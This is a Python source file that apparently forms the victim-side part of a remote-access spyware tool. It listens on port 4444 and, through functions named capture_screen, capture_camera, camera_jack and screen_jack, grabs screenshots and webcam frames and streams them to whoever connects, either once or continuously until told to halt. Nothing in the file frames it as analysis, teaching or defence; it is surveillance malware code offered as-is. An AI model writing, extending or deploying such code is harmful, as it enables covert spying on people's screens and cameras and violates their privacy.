import cv2
import sys, pickle, struct
import socket
import numpy as np
from PIL import ImageGrab as ig
import time

ip = socket.gethostname()
port = 4444

def config():
    global s, conn
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(5)
    conn, addr = s.accept()

def capture_screen():
    config()
    img = ig.grab(all_screens=True)
    img_np = np.array(img)
    data = pickle.dumps(img_np)
    conn.sendall(data)
    conn.close()
    s.close()

def capture_camera():
    config()
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    data = pickle.dumps(frame)
    conn.sendall(data)
    conn.close()
    s.close()

def camera_jack():
    config()
    try:
        config()
        cap = cv2.VideoCapture(0)
        while True:
            ret, frame = cap.read()
            data = pickle.dumps(frame)
            conn.sendall(data)

    except ConnectionAbortedError:
        pass
    except ConnectionResetError:
        pass

def screen_jack():
    config()
    try:
        while True:  
            img = ig.grab(all_screens=True)
            img_np = np.array(img)
            data = pickle.dumps(img_np)
            conn.sendall(data)
            confirmation = conn.recv(5000)
            confirmation = confirmation.decode()
            if confirmation == ("halt"):
                conn.close()
                s.close()
                break

    except ConnectionAbortedError:
        conn.close()
        s.close()
        pass
    except ConnectionResetError:
        conn.close()
        s.close()
        pass
